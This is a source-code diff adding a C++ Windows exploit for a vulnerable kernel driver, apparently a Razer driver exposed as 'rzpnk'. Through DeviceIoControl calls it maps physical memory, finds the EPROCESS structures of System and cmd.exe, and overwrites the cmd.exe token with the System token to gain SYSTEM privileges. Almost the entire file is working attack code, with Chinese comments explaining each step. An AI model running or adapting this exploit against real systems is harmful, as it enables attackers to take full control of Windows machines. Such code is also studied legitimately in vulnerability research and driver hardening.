@@ -1,0 +1,443 @@
+#include <windows.h>
+#include <comdef.h>
+#include <Wbemidl.h>
+#include <iostream>
+#include <unordered_map>
+#include <algorithm>
+#include <cstdio>
+#include <cstdlib>
+#include <cstdint>
+#pragma comment(lib, "wbemuuid.lib")
+// #define EPROCESS_IAMGE_NAME_OFFSET 0x5A8
+#define SYSTEM_IMAGE_NAME_OFFSET 0x5E4 // 0x3C+0x5A8
+#define CMD_IMAGE_NAME_OFFSET 0x624 // 0x7C+0x5A8
+#define SYSTEM_TOKEN_OFFSET 0x4F4 // 0x3C+0x4B8
+#define CMD_TOKNE_OFFSET 0x534 // 0x7C+0x4B8
+#define SYSTEM_IMAGE_NAME "System"
+#define CMD_IMAGE_NAME "cmd.exe"
+#define STEP 0x1000
+#ifndef max
+#define max(a,b)            (((a) > (b)) ? (a) : (b))
+#endif
+#define b8 DWORD64
+#define b4 DWORD
+#define b2 WORD
+#define b1 UCHAR 
+DWORD64 q(PBYTE a1) { return *(DWORD64*)(a1); }
+DWORD d(PBYTE a1) { return *(DWORD*)(a1); }
+WORD w(PBYTE a1) { return *(WORD*)(a1); }
+UCHAR b(PBYTE a1) { return *(PBYTE)(a1); }
+b1* GMemBuffer;
+std::vector<USHORT> handleValueArray;
+DWORD64 phAmountInBytes;
+#include <windows.h>
+#include <stdio.h>
+#include <algorithm> 
+#include <vector>
+typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
+	ULONG SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+	);
+
+#define SystemHandleInformation 0x10
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+bool DoesProcessExist(DWORD pid) {
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+	if (hProcess) {
+		CloseHandle(hProcess);
+		return true; // Process exists
+	}
+	return GetLastError() != ERROR_INVALID_PARAMETER; // INVALID_PARAMETER → invalid PID
+}
+
+typedef struct _SYSTEM_HANDLE {
+	ULONG       ProcessId;
+	BYTE        ObjectTypeNumber;
+	BYTE        Flags;
+	USHORT      Handle;
+	PVOID       Object;
+	ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+	ULONG HandleCount;
+	SYSTEM_HANDLE Handles[1]; // Variable-length array
+} SYSTEM_HANDLE_INFORMATION;
+
+int getSystemSectionHandle() {
+	
+	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+	if (!ntdll) {
+		printf("Failed to load ntdll.dll\n");
+		return 1;
+	}
+
+	NtQuerySystemInformation_t NtQuerySystemInformation =
+		(NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
+
+	if (!NtQuerySystemInformation) {
+		printf("Failed to get NtQuerySystemInformation address\n");
+		return 1;
+	}
+
+	ULONG bufferSize = 0x10000;
+	PVOID buffer = NULL;
+	ULONG returnLength = 0;
+	NTSTATUS status;
+
+	do {
+		if (buffer) free(buffer);
+		buffer = malloc(bufferSize);
+		if (!buffer) {
+			printf("Memory allocation failed\n");
+			return 1;
+		}
+
+		status = NtQuerySystemInformation(SystemHandleInformation, buffer, bufferSize, &returnLength);
+		if (status == STATUS_INFO_LENGTH_MISMATCH) {
+			bufferSize *= 2;
+		}
+
+	} while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+	if (status != 0) {
+		printf("NtQuerySystemInformation failed: 0x%08X\n", status);
+		free(buffer);
+		return 1;
+	}
+
+	SYSTEM_HANDLE_INFORMATION* handleInfo = (SYSTEM_HANDLE_INFORMATION*)buffer;
+	printf("Number of handles: %lu\n", handleInfo->HandleCount);
+
+	for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
+		SYSTEM_HANDLE h = handleInfo->Handles[i];
+		//if (h.Handle == 0x550 || h.Handle == 0x574) {
+
+		//	printf("PID: %5lu  Handle: 0x%04X  ObjectType: %-3u  Access: 0x%08X\n",
+		//		h.ProcessId, h.Handle, h.ObjectTypeNumber, h.GrantedAccess);
+		//	printf("object address: 0x%p\n", h.Object);
+		//	system("pause");
+		//}
+		if (h.ProcessId == 4 && h.ObjectTypeNumber == 42) {
+			handleValueArray.push_back(h.Handle);
+		}
+	}
+
+	free(buffer);
+
+	std::sort(handleValueArray.begin(), handleValueArray.end());
+}
+
+
+void getHardwareMappings(std::unordered_map<uint64_t, uint64_t>& hardwareMappings)
+{
+	if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED)))
+	{
+		return;
+	}
+
+	if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL)))
+	{
+		CoUninitialize();
+		return;
+	}
+
+	IWbemLocator *pLoc = NULL;
+	if (FAILED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc)))
+	{
+		CoUninitialize();
+		return;
+	}
+
+	IWbemServices *pSvc = NULL;
+	if (FAILED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc)))
+	{
+		pLoc->Release();
+		CoUninitialize();
+		return;
+	}
+
+	if (FAILED(CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE)))
+	{
+		pSvc->Release();
+		pLoc->Release();
+		CoUninitialize();
+		return;
+	}
+
+	IEnumWbemClassObject* pEnumerator = NULL;
+	if (FAILED(pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM Win32_DeviceMemoryAddress"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator)))
+	{
+		pSvc->Release();
+		pLoc->Release();
+		CoUninitialize();
+		return;
+	}
+
+	std::vector<std::pair<uint64_t, uint64_t>> ranges;
+	IWbemClassObject *pclsObj = NULL;
+	ULONG uReturn = 0;
+	while (pEnumerator)
+	{
+		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+		if (0 == uReturn)
+		{
+			break;
+		}
+
+		VARIANT vtProp;
+		pclsObj->Get(L"StartingAddress", 0, &vtProp, 0, 0);
+		uint64_t startAddr = 0;
+		swscanf_s(vtProp.bstrVal, L"%lld", &startAddr);
+		VariantClear(&vtProp);
+
+		pclsObj->Get(L"EndingAddress", 0, &vtProp, 0, 0);
+		uint64_t endAddr = 0;
+		swscanf_s(vtProp.bstrVal, L"%lld", &endAddr);
+		VariantClear(&vtProp);
+
+		pclsObj->Release();
+		ranges.push_back(std::pair<uint64_t, uint64_t>(startAddr, endAddr + 1));
+		//printf("%0I64X %0I64X\n", startAddr, endAddr);
+	}
+	//insert dummy range <0xF0000000, 0xFFFFFFFF>
+	ranges.push_back(std::pair<uint64_t, uint64_t>(0xF0000000LL, 0x100000000LL));
+
+	std::sort(ranges.begin(), ranges.end());
+	auto it = ranges.begin();
+	std::pair<uint64_t, uint64_t> current = *(it)++;
+	while (it != ranges.end())
+	{
+		if (current.second >= it->first)
+		{
+			current.second = max(current.second, it->second);
+		}
+		else
+		{
+			hardwareMappings[current.first] = current.second - current.first;
+			current = *(it);
+		}
+		it++;
+	}
+	hardwareMappings[current.first] = current.second - current.first;
+
+	pSvc->Release();
+	pLoc->Release();
+	pEnumerator->Release();
+	CoUninitialize();
+}
+bool writePhMem(HANDLE hDevice, b8 destPhAddr, b8 b8Value);
+HANDLE getDriverHandle();
+b8 elevatePriv(HANDLE hDev,std::unordered_map<uint64_t, uint64_t> hwHole);
+
+bool mapPhMem(HANDLE hDevice, b8 phStart, b4 size);
+int main() {
+	MEMORYSTATUSEX memStatus = {};
+	memStatus.dwLength = sizeof(memStatus);
+
+	if (GlobalMemoryStatusEx(&memStatus)) {
+		std::cout << "Total physical memory (bytes): " << memStatus.ullTotalPhys << std::endl;
+	}
+	else {
+		std::cerr << "Failed to get memory status." << std::endl;
+	}
+	phAmountInBytes = memStatus.ullTotalPhys;
+	getSystemSectionHandle();
+	HANDLE hDevice = getDriverHandle();
+	// Output buffer 1KB
+	LPVOID OutBuffer = VirtualAlloc(
+		nullptr,
+		STEP,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE
+	);
+
+	if (!OutBuffer) {
+		std::cout << "\n[!] Failed to allocate output buffer.\n";
+		CloseHandle(hDevice);
+
+	}
+	GMemBuffer = (b1*)OutBuffer;
+	
+	std::unordered_map<uint64_t, uint64_t> mapping;
+	// 枚举出来所有的设备内存范围，不然读取到这些内存地址会直接导致蓝屏
+	//getHardwareMappings(mapping);
+	//for (const auto& pair : mapping) {
+	//	printf("0x%p -> 0x%p\n\n", pair.first, pair.second);
+	//}
+	//system("pause");
+	// 然后就可以和驱动交互来读写内存了
+	printf("trying to elvate my privilege\n");
+	elevatePriv(hDevice,mapping);
+	return 0;
+} 
+b8 elevatePriv(HANDLE hDev,std::unordered_map<uint64_t, uint64_t> hwHole) {
+	
+	b8 systemToken = 0;
+	b8 cmdTokenPhAddr = 0;
+	// 基本思想就是扫描整块物理内存，来定位系统进程的EPROCESS
+	// 但是我们要调过硬件内存区域
+	b8 phMemSize;
+	// 获取系统上安装的物理内存的大小 单位是kb 1024bytes
+	GetPhysicallyInstalledSystemMemory(&phMemSize);
+	// 那么物理内存地址的最大值应该是
+	// 每次读取一个内存页 4kb
+	mapPhMem(hDev, 0x10, 0x10);// step);
+	return 0;
+}
+bool writePhMem(HANDLE hDevice, b8 destPhAddr, b8 b8Value) {
+	unsigned char InBuffer[0x18] = { 0 };
+	*(reinterpret_cast<INT64*>(&InBuffer[0])) = destPhAddr;
+	*(reinterpret_cast<INT64*>(&InBuffer[0x10])) = destPhAddr;
+	*(reinterpret_cast<INT64*>(&InBuffer[0xc])) = 8;
+
+
+
+	// Ptr receiving output byte count
+	DWORD BytesReturned = 0;
+
+
+	BOOL CallResult = DeviceIoControl(
+		hDevice,
+		0xC3506104,
+		InBuffer,
+		sizeof(InBuffer), 
+		GMemBuffer, // outbuffer随便填，因为根本就用不到
+		8,
+		&BytesReturned,
+		nullptr
+	);
+
+	if (!CallResult) {
+		std::cout << "\n[!] DeviceIoControl failed..\n";
+		printf("error code: 0x%x\n", GetLastError());
+		return 0;
+		CloseHandle(hDevice);
+
+	}
+	return 1;
+}
+HANDLE getDriverHandle() {
+	HANDLE hProcess = 0;
+	HANDLE hDevice = CreateFileA(
+		"\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095",
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		nullptr,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
+		nullptr
+	);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		std::cout << "\n[!] Unable to get driver handle..\n";
+		printf("error code: 0x%x\n", GetLastError());
+		return 0;
+	}
+	else {
+		std::cout << "\n[>] Driver access OK..\n";
+		std::cout << "[+] lpFileName: \\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk\n";
+		std::cout << "[+] Handle: " << hDevice << "\n";
+	}
+
+	return hDevice;
+}
+bool mapPhMem(HANDLE hDevice,b8 phStart,b4 size) {
+
+	 
+		// 尝试map
+		/*
+		其中a3为inbuffer的0x10（section handler），a4为inbuffer的0x20（CommitSize）
+
+也就是说我们可以控制ZwMapViewOfSection函数的handler参数和commit size参数，以及第7个参数ViewSize，由我们的a4控制，也就是可以控制实际上要映射多大的内存出来，我们直接指定a4为0即可映射整个section
+		*/
+
+
+
+		unsigned char InBuffer[0x40] = { 0 };
+		unsigned char outBuffer[0x40] = { 0 };
+	// inBuffer的0x8存一个b4，值为1，指示驱动将映射出来的物理内存拷贝到我们传过去的buffer中
+	// outBuffer将存储映射出来的物理内存
+	// inBuffer的0xC存一个b4作为要映射的size
+	// inBuffer的0存一个b8，作为物理内存的开始地址
+	*(reinterpret_cast<INT64*>(&InBuffer[0x0])) = (DWORD64)GetCurrentProcess();
+	*(reinterpret_cast<INT64*>(&InBuffer[0x8])) = (DWORD64)GetCurrentProcessId();
+	*(reinterpret_cast<DWORD64*>(&InBuffer[0x10])) = 0xffffffff80000000 + 0x550;
+	*(reinterpret_cast<INT32*>(&InBuffer[0x20])) = phAmountInBytes;
+
+	
+
+	// Ptr receiving output byte count
+	DWORD BytesReturned = 0;
+
+	
+	BOOL CallResult = DeviceIoControl(
+		hDevice,
+		0x22a064,
+		InBuffer,
+		sizeof(InBuffer),
+		outBuffer,
+		0x40,
+		&BytesReturned,
+		nullptr
+	);
+
+	if (!CallResult) {
+		std::cout << "\n[!] DeviceIoControl failed..\n";
+		printf("error code: 0x%x\n", GetLastError());
+		return 0;
+		CloseHandle(hDevice);
+		 
+	}  
+	// 查看status
+
+	printf("status: 0x%x\n", *(DWORD*)(outBuffer + 0x28));
+ 
+	// outbuffer的0x28存储ZwMapViewOfSection的返回值 status
+	printf("map out base addr: 0x%p\n", *(DWORD64*)(outBuffer + 0x18));
+	BYTE* base = (BYTE*)*(DWORD64*)(outBuffer + 0x18);
+	// 尝试读取
+	b8 systemToken = 0;
+	b8 cmdTokenPhAddr = 0;
+	printf("0x%x\n", *(BYTE*)(base));
+	GMemBuffer = base;
+	//// 然后开始搜索proc
+	for (b8 j = 0; j < phAmountInBytes - 4; j++) {
+	 	// 这里需要注意，如果j+4已经超过了0x1000，就要终止循环了
+	 	if (*(b4*)(GMemBuffer + j) == 0x636F7250) {
+	 		//printf("located eprocess mem region\n");
+		 
+	 		if (!strcmp((char*)(GMemBuffer + j + SYSTEM_IMAGE_NAME_OFFSET), SYSTEM_IMAGE_NAME)) {
+				printf("System eprocess address: 0x%p\n", GMemBuffer + j+ SYSTEM_TOKEN_OFFSET-0x4b8);
+			
+	 			systemToken = *(b8*)(GMemBuffer + j + SYSTEM_TOKEN_OFFSET);
+	 			printf("system token value: 0x%p\n", systemToken);
+				system("pause");
+	 			if (cmdTokenPhAddr)
+	 				goto END;
+	 		}
+	 		else if (!cmdTokenPhAddr && !strcmp((char*)(GMemBuffer + j + CMD_IMAGE_NAME_OFFSET), CMD_IMAGE_NAME)) {
+	 			// 这里可能会发现很多cmd.exe，但是他们可能是无效的，我们需要获取到他的pid来检查以下是否是存活的
+				// uniqueprocessid 440 	  token 4b8  
+				b8 pid = *(b8*)(base + j + CMD_TOKNE_OFFSET - (0x4b8 - 0x440));
+				if (!DoesProcessExist(pid))continue;
+				printf("cmd eprocess address: 0x%p\n", GMemBuffer + j+ CMD_TOKNE_OFFSET-0x4b8);
+			
+	 			cmdTokenPhAddr = j+ CMD_TOKNE_OFFSET;
+	 			printf("cmd.exe token address: 0x%p\n", base+j+ CMD_TOKNE_OFFSET);
+				system("pause");
+	 			if (systemToken)
+	 				goto END;
+	 		}
+	 	}
+	 }
+END:
+	printf("cmdTokenAddr: 0x%p\tsystemToken: 0x%p\n", base+cmdTokenPhAddr, systemToken);
+	system("pause");
+	 *(b8*)(base+cmdTokenPhAddr) = systemToken;
+	 exit(-1);
+	return 1;
+}
